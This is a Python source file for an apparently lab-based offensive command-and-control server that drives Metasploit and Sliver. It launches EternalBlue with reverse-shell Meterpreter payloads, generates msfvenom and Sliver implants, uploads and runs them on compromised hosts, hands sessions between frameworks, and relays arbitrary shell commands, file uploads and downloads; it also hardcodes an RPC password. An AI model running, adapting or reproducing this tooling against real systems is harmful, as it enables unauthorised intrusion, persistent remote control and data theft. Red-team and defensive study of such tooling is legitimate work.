import os
import time
import socket
import threading
import subprocess
import json
import pexpect
from socket_threading import Server
from pymetasploit3.msfrpc import MsfRpcClient

from socket_threading import RED, BLUE, GREEN, YELLOW, RESET

MSF_HOST = "10.1.1.2"
MSF_PORT = 1337
MSF_PASSWORD = "memes"
RESOURCE_SCRIPT = "/usr/src/metasploit-framework/docker/msfconsole.rc"

# Alex New
SLIVER_HOST = "10.1.1.2"
SLIVER_PORT = 55552
# Alex End

# ────────────── globals ────────────────────────────────────────────────────────
server        = None
msfInstance   = None
sliver_client = None
# ───────────────────────────────────────────────────────────────────────────────
ALWAYS_PROMPT_OPTS_EXPLOIT = {"RHOSTS", "RPORT", "USERNAME", "PASSWORD", "THREADS", "LHOST", "LPORT", "PAYLOAD"}
ALWAYS_PROMPT_OPTS_AUXILIARY = {"RHOSTS", "RPORT", "USERNAME", "PASSWORD", "THREADS"}

def start_session_monitor():
    monitor_thread = threading.Thread(
        target=monitor_meterpreter_sessions,
        daemon=True
    )
    monitor_thread.start()

def monitor_meterpreter_sessions():
    """Prints new sessions continuously."""
    if msfInstance is None:
        return
    print(f"{GREEN}[+] Starting session monitor{RESET}")
    while True:
        try:
            for sid, sess in msfInstance.sessions.list.items():
                print(f"{GREEN}[+] Meterpreter session {sid} detected "
                      f"({sess['type']}){RESET}")
        except Exception:
            pass
        time.sleep(5)          # keep CPU happy
        
def run_meterpreter_exploit(target_ip):
    """Execute a Meterpreter payload against the target."""
    if msfInstance is None:
        return f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"

    exploit = msfInstance.modules.use("exploit", "windows/smb/ms17_010_eternalblue")
    if exploit is None:
        return f"{RED}[!] Failed to load exploit module{RESET}"

    # Set parameters for the exploit
    exploit["RHOSTS"] = target_ip
    exploit["PAYLOAD"] = "windows/x64/meterpreter/reverse_tcp"
    exploit["LHOST"] = "10.1.1.2"
    exploit["LPORT"] = 4444  # Listening port

    # Execute the exploit
    job_id = exploit.execute()
    return f"{GREEN}[+] Meterpreter exploit launched with job ID {job_id}{RESET}"

# Alex New
def generate_meterpreter_payload():
    output_file = "/workspace/enderCLI/meterpreter_payload"
    cmd = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={MSF_HOST} LPORT=4444 -f elf -o {output_file}"
    try:
        subprocess.run(cmd, shell=True, check=True)
        print(f"{GREEN}[+] Generated Meterpreter payload at {output_file}{RESET}")
        return output_file
    except Exception as e:
        print(f"{RED}[!] Failed to generate Meterpreter payload: {e}{RESET}")
        return None
# Alex End

def connect_to_msfserver(password, server, port, max_retries=10, retry_delay=2):
    print(f"{GREEN}=============== Starting Metasploit API ==============={RESET}")
    for attempt in range(max_retries):
        try:
            msf_client = MsfRpcClient(password, server=server, port=port)
            print(f"{GREEN}[+] Successfully connected to MSF Server!{RESET}")
            return msf_client
        except Exception as e:
            print(f"{YELLOW}[!] Failed to connect to MSF Server: {e}, RETRYING ({attempt+1}/{max_retries}){RESET}")
            time.sleep(retry_delay)
    print(f"{RED}[!] Max retries reached. Could not connect to MSF Server.{RESET}")
    return None

def start_msfconsole_with_script(resource_script):
    """Launch msfconsole in the background using a resource script."""
    if not os.path.exists(resource_script):
        print(f"{RED}[!] Resource script {resource_script} not found!{RESET}")
        return False
    print(f"{GREEN}[+] Starting msfconsole with resource script: {resource_script}{RESET}")
    try:
        process = subprocess.Popen(
            ["msfconsole", "-r", resource_script],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        time.sleep(5)
        if process.poll() is not None:
            stdout, stderr = process.communicate()
            print(f"{RED}[!] msfconsole failed to start: {stderr}{RESET}")
            return False
        print(f"{GREEN}[+] msfconsole started successfully! PID: {process.pid}{RESET}")
        return True
    except Exception as e:
        print(f"{RED}[!] Error starting msfconsole: {e}{RESET}")
        return False

def connect_msf():
    """Connect to Metasploit and start monitoring"""
    if not start_msfconsole_with_script(RESOURCE_SCRIPT):
        return None
    
    msf_instance = connect_to_msfserver(
        password=MSF_PASSWORD,
        server=MSF_HOST, 
        port=MSF_PORT
    )
    
    if msf_instance:
        global msfInstance
        msfInstance = msf_instance
        print(f"{GREEN}[+] Registered Metasploit with name 'msf'{RESET}")
        
        # Start session monitoring AFTER successful connection
        start_session_monitor()  # Now properly defined
        return msf_instance
    
    print(f"{RED}[!] Failed to register Metasploit{RESET}")
    return None

##############################
# Interact with Meterpreter
##############################
def interact_meterpreter(session_id, command):
    if msfInstance is None:
        return f"{RED}[-] Not connected to Metasploit.{RESET}"

    all_sess = msfInstance.sessions.list
    if session_id not in all_sess:
        return f"{RED}[!] Session ID {session_id} not found.{RESET}"

    stype = all_sess[session_id]["type"]
    if stype != "meterpreter":
        return f"{RED}[!] Session {session_id} is a {stype} session, not Meterpreter.{RESET}"

    session = msfInstance.sessions.session(session_id)

    # Session passing (msf > sliver)
    # Alex New
    if command == "transfer-sliver":
        beacon_path = generate_beacon("5", "10", SLIVER_HOST, "linux", "amd64", "sliver_beacon", format="bin")
        if not beacon_path:
            return f"{RED}[-] Failed to generate Sliver beacon for handoff.{RESET}"
        session.write(f"upload {beacon_path} /tmp/sliver_beacon")
        session.run_with_output("shell chmod +x /tmp/sliver_beacon && /tmp/sliver_beacon &")
        return f"{GREEN}[+] Handed off session {session_id} to Sliver{RESET}"
    #else:
    #    response = session.run_with_output(command)
    #    return f"{GREEN}[+] Meterpreter Response:\n{response}{RESET}"
    # Alex End
    
    if command.startswith("upload "):
        parts = command.split(maxsplit=2) 
        if len(parts) != 3:
            return f"{RED}Usage: meterpreter <id> upload <local_path> <remote_path>{RESET}"
        local_path, remote_path = parts[1], parts[2]
        try:
            session.upload(local_path, remote_path)
            return f"{GREEN}[+] Uploaded {local_path} to {remote_path}{RESET}"
        except Exception as e:
            return f"{RED}[!] Upload failed: {e}{RESET}"

    elif command.startswith("download "):
        parts = command.split(maxsplit=2)
        if len(parts) != 3:
            return f"{RED}Usage: meterpreter <id> download <remote_path> <local_path>{RESET}"
        remote_path, local_path = parts[1], parts[2]
        try:
            session.download(remote_path, local_path)
            return f"{GREEN}[+] Downloaded {remote_path} to {local_path}{RESET}"
        except Exception as e:
            return f"{RED}[!] Download failed: {e}{RESET}"

    elif command.strip() == "shell":
        try:
            session.shell_write("\n")
            time.sleep(1)
            output = session.shell_read()
            return f"{GREEN}Shell opened. Enter commands directly:\n{output}{RESET}"
        except Exception as e:
            return f"{RED}[!] Failed to open shell: {e}{RESET}"

    else:
        try:
            output = session.run_with_output(command)
            return f"{GREEN}[+] Meterpreter Response:\n{output}{RESET}"
        except Exception as e:
            return f"{RED}[!] Error in Meterpreter command: {e}{RESET}"

##############################
# Searching
##############################
def search_exploit(keyword=None, start=0, count=20):
    if msfInstance is None:
        return [], 0
    all_exploits = msfInstance.modules.exploits
    if keyword:
        filtered = [x for x in all_exploits if keyword.lower() in x.lower()]
    else:
        filtered = all_exploits
    total = len(filtered)
    paginated = filtered[start : start+count]
    numbered = [f"{i+1+start}. {ex}" for i,ex in enumerate(paginated)]
    if start+count < total:
        numbered.append(f"{BLUE}[SERVER] Send 'next'/'prev' or 'exit'{RESET}")
    return numbered, total

def search_auxiliary_modules(keyword=None, start=0, count=20):
    if msfInstance is None:
        return [], 0
    all_aux = msfInstance.modules.auxiliary
    if keyword:
        filtered = [a for a in all_aux if keyword.lower() in a.lower()]
    else:
        filtered = all_aux
    total = len(filtered)
    paginated = filtered[start : start+count]
    return paginated, total


##############################
# Parse user param
##############################
def parse_param_value(opt_data, user_input):
    """Convert user_input to correct type: int for port, bool, etc."""
    if user_input is None:
        return None
    user_input = user_input.strip()
    if not user_input:
        return None

    msf_type = opt_data.get('type', '').lower()
    default_val = opt_data.get('default', None)

    if msf_type == 'bool' or isinstance(default_val, bool):
        return (user_input.lower() == 'true')
    elif msf_type == 'integer' or isinstance(default_val, int):
        return int(user_input)
    elif msf_type == 'port':
        return int(user_input)
    return user_input

#####################
# Run msf exploit 
#####################
def run_msf_exploit(mtype, mname, user_params, c2="metasploit",action="exploit"):
    if msfInstance is None:
        return f"{RED}[-] Not connected to Metasploit.{RESET}"

    try:
        exploit = msfInstance.modules.use(mtype, mname)
    except Exception as e:
        return f"{RED}[!] Failed to load module: {str(e)}{RESET}"
    
    payload_name = None
    # BYOS: bring your own stager (Sliver handoff)
    if c2 == "sliver":
        beacon_path = generate_beacon("5", "0", SLIVER_HOST, "linux", "amd64", "sliver_beacon", format="shellcode")
        if not beacon_path:
            return f"{RED}[-] Failed to generate Sliver shellcode.{RESET}"
        try:
            with open(beacon_path, "rb") as f:
                shellcode = f.read()
            exploit["PAYLOAD"] = "generic/custom"
            exploit["CUSTOM_PAYLOAD"] = shellcode
            exploit["LHOST"] = SLIVER_HOST
            exploit["LPORT"] = SLIVER_PORT
        except Exception as e:
            return f"{RED}[!] Error setting shellcode payload: {e}{RESET}"
    else:
        # ---------------- choose payload (only for 'exploit' action) -------------
        if action == "exploit" and mtype == "exploit":
            # choose meterpreter automatically if user omitted PAYLOAD
            payload_name = user_params.get("PAYLOAD") or pick_meterpreter_payload(exploit)
            try:
                exploit.payload = payload_name
            except Exception:
                pass   # some modules ignore .payload assignment
        
    # ---------------- apply user‑supplied options ----------------------------
    for k, v in user_params.items():
        try:
            if k in exploit.options:
                exploit[k] = v
        except Exception as e:
            print(f"{YELLOW}[!] Failed to set option {k}: {e}{RESET}")

    # ---------------- run check or exploit -----------------------------------
    try:
        if action == "check":
            chk = exploit.check() if callable(exploit.check) else exploit.check
            return str(chk)
        result = exploit.execute(payload=payload_name)
        return json.dumps(result)
    except Exception as e:
        return f"{RED}[!] Exploit failed: {e}{RESET}"


# Alex New
def interact_sliver(session_id, command):
    """Interact with a Sliver session, including handoff to Metasploit."""
    global sliver_client
    if sliver_client is None:
        return f"{RED}[-] Sliver client not running.{RESET}"

    try:
        # Check if session exists by listing sessions
        sliver_client.sendline("sessions")
        time.sleep(2)
        output = sliver_client.read_nonblocking(size=4096, timeout=2)
        if session_id not in output:
            return f"{RED}[!] Invalid Sliver session ID: {session_id}{RESET}"

        if command == "handoff_to_metasploit":
            # Generate Meterpreter payload
            payload_path = generate_meterpreter_payload()
            if not payload_path:
                return f"{RED}[-] Failed to generate Meterpreter payload.{RESET}"

            # Use the session
            sliver_client.sendline(f"use {session_id}")
            sliver_client.expect(r">", timeout=10)

            # Upload payload
            upload_cmd = f"upload {payload_path} /workspace/enderCLI/meterpreter_payload"
            sliver_client.sendline(upload_cmd)
            time.sleep(5)
            output = sliver_client.read_nonblocking(size=4096, timeout=5)
            if "Uploaded" not in output:
                return f"{RED}[!] Failed to upload Meterpreter payload: {output}{RESET}"

            # Execute payload
            execute_cmd = "execute -f /workspace/enderCLI/meterpreter_payload"
            sliver_client.sendline(execute_cmd)
            time.sleep(5)
            output = sliver_client.read_nonblocking(size=4096, timeout=5)
            print(f"{GREEN}[+] Execute output: {output}{RESET}")

            # Return to main prompt
            sliver_client.sendline("sessions")
            return f"{GREEN}[+] Handed off Sliver session {session_id} to Metasploit{RESET}"
        else:
            sliver_client.sendline(f"use {session_id}")
            sliver_client.expect(r">", timeout=10)
            sliver_client.sendline(command)
            time.sleep(2)
            response = sliver_client.read_nonblocking(size=4096, timeout=2)
            return f"{GREEN}[+] Sliver Response:\n{response}{RESET}"

    except Exception as e:
        return f"{RED}[!] Error interacting with Sliver session: {e}{RESET}"
# Alex End

# Alex New
def generate_beacon(seconds, jitter, http, os, arch, beacon_name, format="bin"):
    output_file = f"/workspace/enderCLI/{beacon_name}"
    if format == "shellcode":
        beacon_creation_command = f"generate beacon --seconds {seconds} --jitter {jitter} --http {http} --os {os} --arch {arch} --format shellcode --save {output_file}"
    else:
        beacon_creation_command = f"generate beacon --seconds {seconds} --jitter {jitter} --http {http} --os {os} --arch {arch} --save {output_file}"
    
    print(f"{GREEN}[+] Sending Beacon Creation Command: {beacon_creation_command}{RESET}")
    sliver_client.sendline(beacon_creation_command)
    output = ""
    timeout = 30
    start_time = time.time()
    while time.time() - start_time < timeout:
        chunk = sliver_client.read_nonblocking(size=1024, timeout=5)
        output += chunk
        print(chunk)
        if 'Implant saved to' in chunk:
            break
    return output_file if 'Implant saved to' in output else None
# Alex End

#####################
# Validate Module 
#####################
def validate_module_type(module_type, module_name):
    if msfInstance is None:
        return False, f"{RED}[-] Not connected to Metasploit.{RESET}"

    if module_type == "exploit":
        if module_name not in msfInstance.modules.exploits:
            return False, f"{RED}{module_name} is NOT an exploit. Try: run auxiliary {module_name}{RESET}"
    elif module_type == "auxiliary":
        if module_name not in msfInstance.modules.auxiliary:
            return False, f"{RED}{module_name} is NOT an auxiliary. Try: run exploit {module_name}{RESET}"
    return True, None

#####################
# helper method for payloads 
#####################
def pick_meterpreter_payload(exploit_mod):
    """
    • First look for a reverse‑tcp Meterpreter in exploit_mod.compatible_payloads.
    • If none, return the FIRST compatible payload Metasploit reports.
    • If list is empty, fall back to a platform guess, then generic shell.
    This guarantees we never return None.
    """
    try:
        for p in exploit_mod.compatible_payloads:
            if "meterpreter" in p and "reverse_tcp" in p:
                return p
        # no meterpreter; take the first compatible payload if available
        if exploit_mod.compatible_payloads:
            return exploit_mod.compatible_payloads[0]
    except Exception:
        pass

    # guess by platform path
    path = exploit_mod.fullname.lower()
    if "windows" in path:
        return "windows/x64/meterpreter/reverse_tcp"
    if "linux" in path:
        return "linux/x64/meterpreter/reverse_tcp"
    if "php" in path:
        return "php/meterpreter/reverse_tcp"
    if "java" in path:
        return "java/meterpreter/reverse_tcp"
    return "generic/shell_reverse_tcp"

##############################
# Main Handler
##############################
def handle_message(data, client_address):
    global msfInstance
    print(f"{BLUE}[Server] Processing message: '{data}' from {client_address}{RESET}")

    parts   = data.strip().split()
    command = parts[0] if parts else ""
    options = parts
    
    # Track user state
    if not hasattr(handle_message, 'search_state'):
        handle_message.search_state = {}
    client_state = handle_message.search_state.setdefault(
        client_address,
        {
            'keyword': None, 'start': 0,
            'in_search': False, 'in_run': False,
            'run_module': None, 'beacon': False
        }
    )
    
    # ------------------------------------------------------------------ create beacon
    if command == "create_beacon": 
        if len(options) < 9:
            return (
                f"{RED}[!] Invalid Sliver Beacon Creation command: "
                f"create_beacon [operator_name] [lhost] [seconds] [jitter] "
                f"[http] [os] [arch] [beacon_name]{RESET}"
            )
        beacon = create_sliver_beacon(
            options[1], options[2], options[3], options[4],
            options[5], options[6], options[7], options[8]
        )
        if beacon:
            client_state['beacon'] = True
            return f"{BLUE}[+] Created Sliver Beacon!{RESET}"
        return f"{RED}[!] Sliver beacon creation failed!{RESET}"

    # ------------------------------------------------------------------ connect
    if command == "connect":
        msfInstance = connect_msf()
        client_state.update({'in_search': False, 'in_run': False})
        return (
            f"{BLUE}[+] Connected to Metasploit!{RESET}"
            if msfInstance else
            f"{RED}[-] Failed to connect to Metasploit{RESET}"
        )
    
    # ------------------------------------------------------------------ search
    if command == "search":
        if len(parts) < 3:
            return f"{RED}[!] Usage: search [exploits|auxiliary] <keyword> [start_index]{RESET}"

        mod_type  = parts[1].lower()
        keyword   = parts[2]
        start_idx = int(parts[3]) if len(parts) > 3 and parts[3].isdigit() else 0

        if msfInstance is None:
            return f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"

        if mod_type == "exploits":
            client_state.update({'keyword': keyword, 'start': start_idx, 'in_search': True})
            results, total = search_exploit(keyword, start_idx)
            if results:
                header = (
                    f"{BLUE}Exploit modules matching '{keyword}' "
                    f"({start_idx}-{min(start_idx+20, total)} of {total}):{RESET}"
                )
                return header + "\n" + "\n".join(results)
            return f"{BLUE}No matching exploit modules found.{RESET}"
        return f"{RED}[!] Invalid module type. Use 'search exploits' or 'search auxiliary'{RESET}"

    # ------------------------------------------------------------------ run (initial call + prompt cycle)
    if command == "run" and not client_state.get("in_run"):
        # ── FIRST INVOCATION ────────────────────────────────────────────
        action = "exploit"
        if len(options) > 3 and options[3].lower() == "check":
            action = "check"
        if len(options) < 3:
            return f"{RED}[!] Usage: run [exploit|auxiliary] <module_name>{RESET}"

        module_type, module_name = options[1], options[2]
        ok, err = validate_module_type(module_type, module_name)
        if not ok:
            return err
        if msfInstance is None:
            return f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"

        mod_obj  = msfInstance.modules.use(module_type, module_name)
        prompts  = []

        if module_type == "exploit":
            # ---- always ask PAYLOAD, LHOST, LPORT ----
            default_pay = pick_meterpreter_payload(mod_obj) 
            prompts.append({"name": "PAYLOAD","default": default_pay,
                            "prompt": f"Please enter PAYLOAD (default: {default_pay})"})
            prompts.append({"name": "LHOST","default": MSF_HOST,
                            "prompt": f"Please enter LHOST (default: {MSF_HOST})"})
            prompts.append({"name": "LPORT","default": 4444,
                            "prompt": "Please enter LPORT (default: 4444)"})
            for opt in ("SMBUser","SMBPass","RHOSTS","RPORT"):
                if opt in mod_obj.options:
                    info    = mod_obj._info["options"][opt]
                    default = info.get("default")
                    msg = f"Please enter {opt}" + (f" (default: {default})" if default is not None else "")
                    prompts.append({"name": opt,"default": default,"prompt": msg})

        # build prompts for auxiliary modules
        else:  # auxiliary
            for opt in ("USERNAME","PASSWORD","RHOSTS","RPORT","THREADS"):
                if opt in mod_obj.options:
                    info    = mod_obj._info["options"][opt]
                    default = info.get("default")
                    msg = f"Please enter {opt}" + (f" (default: {default})" if default is not None else "")
                    prompts.append({"name": opt,"default": default,"prompt": msg})
        # ▲▲▲ END new code ▲▲▲

        # safety: if no prompts needed, execute immediately
        if not prompts:
            return run_msf_exploit(module_type, module_name, {})

        client_state.update({
            "in_run": True,
            "prompt_queue": prompts,
            "user_params": {},
            "module_type": module_type,
            "module_name": module_name,
            "action": action
        })
        return f"{BLUE}{prompts[0]['prompt']}: {RESET}"

    elif client_state.get("in_run"):
        # ── PROMPT CYCLE ────────────────────────────────────────────────
        current = client_state["prompt_queue"].pop(0)
        pname   = current["name"]
        mod     = msfInstance.modules.use(client_state["module_type"],
                                        client_state["module_name"])
        opt_def = mod._info["options"].get(pname, {})
        value   = parse_param_value(opt_def, data) or current.get("default")
        client_state["user_params"][pname] = value

        if not client_state["prompt_queue"]:        # all answers collected
            client_state["in_run"] = False
            return run_msf_exploit(
                client_state["module_type"],
                client_state["module_name"],
                client_state["user_params"],
                action=client_state["action"]
            )

        nxt = client_state["prompt_queue"][0]
        return f"{BLUE}{nxt['prompt']}: {RESET}"

    # ------------------------------------------------------------------ next/prev/exit (search paging)
    if command in ["next", "prev"] and client_state['in_search']:
        if msfInstance is None:
            return f"{RED}[-] Not connected to Metasploit.{RESET}"
        client_state['start'] += 20 if command == "next" else -20
        results, total = search_exploit(client_state['keyword'], client_state['start'])
        if results:
            header = (
                f"{BLUE}Exploit modules matching '{client_state['keyword']}' "
                f"({client_state['start']}-{min(client_state['start']+20, total)} of {total}):{RESET}"
            )
            return header + "\n" + "\n".join(results)
        return f"{BLUE}No more exploit modules available.{RESET}"
    
    if command == "exit" and client_state['in_search']:
        client_state.update({'in_search': False, 'keyword': None, 'start': 0})
        return f"{BLUE}Returned to normal CLI.{RESET}"
    
    # ------------------------------------------------------------------ sessions
    if command == "sessions":
        if msfInstance is None:
            return f"{RED}[-] Not connected to Metasploit.{RESET}"
        sessions = msfInstance.sessions.list   # refresh
        if not sessions:
            return f"{YELLOW}[!] No active sessions detected{RESET}"
        lines = []
        for sid, det in sessions.items():
            lines.append(
                f"Session {sid}:\n"
                f"  Type: {det.get('type','?')}\n"
                f"  Host: {det.get('session_host','?')}\n"
                f"  Port: {det.get('session_port','?')}\n"
                f"  Via : {det.get('via_exploit','?')}"
            )
        return f"{GREEN}Active Sessions:\n{RESET}" + "\n\n".join(lines)

    # ------------------------------------------------------------------ meterpreter
    if command.startswith("meterpreter"):
        parts = command.split(maxsplit=2)
        if len(parts) < 3:
            return f"{RED}Usage: meterpreter <session_id> <command>{RESET}"
        session_id, meterpreter_command = parts[1], parts[2]
        try:
            session  = msfInstance.sessions.session(session_id)
            output   = session.run_with_output(meterpreter_command)
            return f"{GREEN}{output}{RESET}"
        except KeyError:
            return f"{RED}Session ID {session_id} does not exist.{RESET}"
    
    # ------------------------------------------------------------------ sliver helpers
    if command == "get-sliver-sessions":
        if sliver_client is None or not sliver_client.isalive():
            return f"{RED}[-] Sliver client not running.{RESET}"
        sliver_client.sendline("sessions")
        time.sleep(2)
        output = sliver_client.read_nonblocking(size=4096, timeout=2)
        return f"{GREEN}[+] Sliver Sessions:\n{output}{RESET}"
            
    if command.startswith("sliver"):
        sections = data.split(maxsplit=2)
        if len(sections) < 3:
            return f"{RED}[!] Usage: sliver <session_id> <command>{RESET}"
        session_id, sliver_cmd = sections[1], sections[2]
        return interact_sliver(session_id, sliver_cmd)
    
    # ------------------------------------------------------------------ jobs
    if command == "jobs":
        if msfInstance is None:
            return f"{RED}[-] Not connected to Metasploit.{RESET}"
        jobs_dict = msfInstance.jobs.list
        if not jobs_dict:
            return "No active jobs."
        return "\n".join([f"ID {jid}: {info['name']}" for jid, info in jobs_dict.items()])

    # ------------------------------------------------------------------ quit
    if command == "quit":
        if server is not None:
            server.exit()
            return f"{GREEN}[+] Server shutting down as requested.{RESET}"
        return f"{RED}[!] Server not initialized.{RESET}"
    
    # ------------------------------------------------------------------ fallthrough
    return f"{RED}[!] Unrecognized or incomplete command.{RESET}"

def create_sliver_beacon(operator, lhost, seconds, jitter, http, os, arch, name):
    return generate_beacon(seconds, jitter, http, os, arch, name)
##############################
# MAIN
##############################
def main():
    global server
    server = Server(host='10.1.1.2', port=4444, message_handler=handle_message)
    server.start()
    try:
        while server.running:
            time.sleep(1)
    except KeyboardInterrupt:
        server.exit()


if __name__ == "__main__":
    main()
